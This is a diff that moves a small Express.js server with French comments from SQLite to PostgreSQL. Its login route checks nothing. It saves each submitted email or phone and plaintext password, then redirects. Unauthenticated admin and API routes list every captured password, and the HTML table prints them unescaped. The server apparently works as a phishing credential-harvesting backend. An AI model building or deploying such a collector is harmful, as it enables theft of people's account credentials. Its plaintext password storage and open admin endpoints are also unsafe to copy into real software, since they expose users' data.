@@ -1,97 +1,83 @@
 const express = require('express');
 const bodyParser = require('body-parser');
-const sqlite3 = require('sqlite3').verbose();
+const { Pool } = require('pg');
 const path = require('path');
 
 const app = express();
-const PORT = 3000;
+const PORT = process.env.PORT || 3000;
 
+// Middleware
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Connexion SQLite
-const db = new sqlite3.Database('./database.sqlite', (err) => {
-  if (err) console.error("Erreur base de données:", err);
-  else console.log("✅ Connecté à SQLite");
+// Connexion PostgreSQL (utilise les variables Render)
+const pool = new Pool({
+  connectionString: process.env.DATABASE_URL, // Render fournira cette URL
+  ssl: { rejectUnauthorized: false } // obligatoire sur Render
 });
 
-// Fonction pour éviter SQLITE_BUSY
-function runWithRetry(sql, params, retries = 5, callback) {
-  db.run(sql, params, function (err) {
-    if (err && err.code === 'SQLITE_BUSY' && retries > 0) {
-      console.log(`Database locked, retrying... (${retries} left)`);
-      setTimeout(() => {
-        runWithRetry(sql, params, retries - 1, callback);
-      }, 50);
-    } else {
-      callback(err, this);
-    }
-  });
-}
-
 // Création table users si elle n'existe pas
-db.run(`
+pool.query(`
   CREATE TABLE IF NOT EXISTS users (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    id SERIAL PRIMARY KEY,
     full_name TEXT NOT NULL,
     email TEXT NOT NULL UNIQUE,
     password TEXT NOT NULL,
     date_of_birth TEXT NOT NULL,
     gender TEXT NOT NULL
   )
-`);
+`).catch(err => console.error("Erreur création table users:", err));
 
 // Création table logins si elle n'existe pas
-db.run(`
+pool.query(`
   CREATE TABLE IF NOT EXISTS logins (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    id SERIAL PRIMARY KEY,
     emailOrPhone TEXT,
     password TEXT,
     login_time TEXT
   )
-`);
+`).catch(err => console.error("Erreur création table logins:", err));
 
 // Route signup
-app.post('/signup', (req, res) => {
+app.post('/signup', async (req, res) => {
   const { full_name, email, password, date_of_birth, gender } = req.body;
-  const sql = `INSERT INTO users (full_name, email, password, date_of_birth, gender) VALUES (?, ?, ?, ?, ?)`;
-  const params = [full_name, email, password, date_of_birth, gender];
-
-  runWithRetry(sql, params, 5, (err) => {
-    if (err) return res.status(400).send('Erreur création utilisateur : ' + err.message);
+  try {
+    await pool.query(
+      `INSERT INTO users (full_name, email, password, date_of_birth, gender) VALUES ($1, $2, $3, $4, $5)`,
+      [full_name, email, password, date_of_birth, gender]
+    );
     res.redirect('/index.html');
-  });
+  } catch (err) {
+    console.error("Erreur création utilisateur:", err);
+    res.status(400).send('Erreur création utilisateur : ' + err.message);
+  }
 });
 
-// Route login (aucune vérification)
-app.post('/login', (req, res) => {
+// Route login
+app.post('/login', async (req, res) => {
   const { emailOrPhone, password } = req.body;
   const now = new Date().toISOString();
-  const sql = `INSERT INTO logins (emailOrPhone, password, login_time) VALUES (?, ?, ?)`;
-  const params = [emailOrPhone, password, now];
-
-  runWithRetry(sql, params, 5, (err) => {
-    if (err) {
-      console.error("Erreur insertion login:", err.message);
-      return res.status(500).send('Erreur base de données');
-    }
+  try {
+    await pool.query(
+      `INSERT INTO logins (emailOrPhone, password, login_time) VALUES ($1, $2, $3)`,
+      [emailOrPhone, password, now]
+    );
     res.redirect('/home');
-  });
+  } catch (err) {
+    console.error("Erreur insertion login:", err);
+    res.status(500).send('Erreur base de données');
+  }
 });
 
-// Route home
+// Page home
 app.get('/home', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'home.html'));
 });
 
-// Route admin pour voir tous les logins
-app.get('/admin/logins', (req, res) => {
-  db.all(`SELECT * FROM logins ORDER BY login_time DESC`, [], (err, rows) => {
-    if (err) {
-      console.error("Erreur récupération logins:", err.message);
-      return res.status(500).send("Erreur base de données");
-    }
-
+// Admin logins
+app.get('/admin/logins', async (req, res) => {
+  try {
+    const result = await pool.query(`SELECT * FROM logins ORDER BY login_time DESC`);
     let html = `
     <html>
     <head>
@@ -103,10 +89,10 @@ app.get('/admin/logins', (req, res) => {
     <table>
     <tr><th>ID</th><th>Email/Phone</th><th>Password</th><th>Login Time</th></tr>`;
     
-    rows.forEach(row => {
+    result.rows.forEach(row => {
       html += `<tr>
         <td>${row.id}</td>
-        <td>${row.emailOrPhone}</td>
+        <td>${row.emailorphone}</td>
         <td>${row.password}</td>
         <td>${row.login_time}</td>
       </tr>`;
@@ -114,20 +100,24 @@ app.get('/admin/logins', (req, res) => {
 
     html += `</table></body></html>`;
     res.send(html);
-  });
-});
-// API pour récupérer tous les logins
-app.get('/api/logins', (req, res) => {
-  db.all(`SELECT * FROM logins ORDER BY login_time DESC`, [], (err, rows) => {
-    if (err) {
-      console.error('Erreur récupération logins:', err.message);
-      return res.status(500).json({ error: 'Erreur base de données' });
-    }
-    res.json(rows); // renvoie les données en JSON
-  });
+  } catch (err) {
+    console.error("Erreur récupération logins:", err);
+    res.status(500).send("Erreur base de données");
+  }
 });
 
-// Démarrage serveur
+// API logins
+app.get('/api/logins', async (req, res) => {
+  try {
+    const result = await pool.query(`SELECT * FROM logins ORDER BY login_time DESC`);
+    res.json(result.rows);
+  } catch (err) {
+    console.error('Erreur récupération logins:', err);
+    res.status(500).json({ error: 'Erreur base de données' });
+  }
+});
+
+// Lancement serveur
 app.listen(PORT, () => {
-  console.log(`🚀 Serveur démarré : http://localhost:${PORT}`);
+  console.log(`🚀 Serveur démarré sur http://localhost:${PORT}`);
 });
